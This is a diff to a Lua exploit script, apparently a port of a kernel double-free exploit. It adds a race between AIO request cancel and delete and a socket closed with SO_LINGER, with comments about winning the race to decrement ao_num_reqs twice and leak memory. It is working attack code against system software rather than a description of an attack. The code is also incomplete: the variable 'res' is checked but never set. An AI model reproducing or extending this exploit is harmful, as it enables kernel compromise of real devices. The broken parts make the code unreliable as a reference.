@@ -113,6 +113,9 @@ IPPROTO_UDP = 17
 IPPROTO_IPV6 = 41
 IPV6_PKTINFO = 46
 INADDR_ANY = 0
+
+SOL_SOCKET = 0xffff
+SO_LINGER = 0x80
 --
 
 AIO_CMD_READ = 1
@@ -351,23 +354,8 @@ function double_free_reqs2(sds)
         return bit32.bor(bit32.lshift(port, 8), bit32.rshift(port, 8)) % 0x10000
     end
 
-    local function htonl(hostlong)
-        local b1 = bit32.band(bit32.rshift(hostlong, 24), 0xFF)
-        local b2 = bit32.band(bit32.rshift(hostlong, 16), 0xFF)
-        local b3 = bit32.band(bit32.rshift(hostlong, 8),  0xFF)
-        local b4 = bit32.band(hostlong,                   0xFF)
-    
-        local swapped_long = bit32.bor(
-            bit32.lshift(b4, 24),
-            bit32.lshift(b3, 16),
-            bit32.lshift(b2, 8),
-            b1
-        )
-    
-        return swapped_long % 0x100000000
-    end
-
-    local socket_path = "/mnt/sandbox/socket"
+    -- local socket_path = "/mnt/sandbox/socket"
+    local socket_path = "/system_tmp/socket"
     
     local server_addr = memory.alloc(128)
     local addrlen = memory.alloc(8)
@@ -384,8 +372,8 @@ function double_free_reqs2(sds)
     local addr_size = 2 + #socket_path + 1  -- family byte + path + null terminator
     
     -- const racer = new Chain();
-    -- const barrier = new Long();
-    -- call_nze('pthread_barrier_init', barrier.addr, 0, 2);
+    local barrier = memory.alloc(8)
+    -- pthread_barrier_init(barrier, 0, 2)
 
     local num_reqs = 3
     local which_req = num_reqs - 1
@@ -408,7 +396,11 @@ function double_free_reqs2(sds)
         error("listen() error: " .. get_error_string())
     end
 
-    for i=0,NUM_RACES do
+    for i=1,NUM_RACES do
+        -- print()
+        -- printf("== attempt #%d ==", i)
+        -- print()
+
         local client_fd = syscall.socket(AF_UNIX, SOCK_STREAM, 0):tonumber()
         if client_fd < 0 then
             error("socket() error: " .. get_error_string())
@@ -422,13 +414,42 @@ function double_free_reqs2(sds)
         if conn_fd < 0 then
             print("accept() error: " .. get_error_string())
         end
-        
-        -- Don't forget to close the client socket in each iteration
+
+        -- force soclose() to sleep
+        local tmp_buffer = memory.alloc(8)
+        memory.write_dword(tmp_buffer, 1)
+        memory.write_dword(tmp_buffer+4, 1)
+
+        if syscall.setsockopt(client_fd, SOL_SOCKET, SO_LINGER, tmp_buffer, 8):tonumber() < 0 then
+            print("setsockopt() error: " .. get_error_string())
+        end
+        memory.write_dword(reqs1 + which_req*0x28 + 0x20, client_fd)
+
+        aio_submit_cmd(cmd, reqs1, num_reqs, aio_ids)
+        aio_multi_cancel(aio_ids, num_reqs)
+        aio_multi_poll(aio_ids, num_reqs)
+
+        -- drop the reference so that aio_multi_delete() will trigger _fdrop()
         syscall.close(client_fd)
+        -- const res = race_one(req_addr, sd_conn, barrier, racer, sds);
+        -- racer.reset();
+
+        -- MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
+        -- twice. this will leave one request undeleted
+        aio_multi_delete(aio_ids, num_reqs)
         syscall.close(conn_fd)
+
+        if res then
+            printf('won race at attempt: %d', i)
+            syscall.close(server_fd)
+            syscall.unlink(server_fd)
+            pthread_barrier_destroy(barrier)
+            return res
+        end
     end
 
     -- Clean up the socket file when done
+    -- TODO: Delete
     syscall.close(server_fd)
     syscall.unlink(server_fd)
     
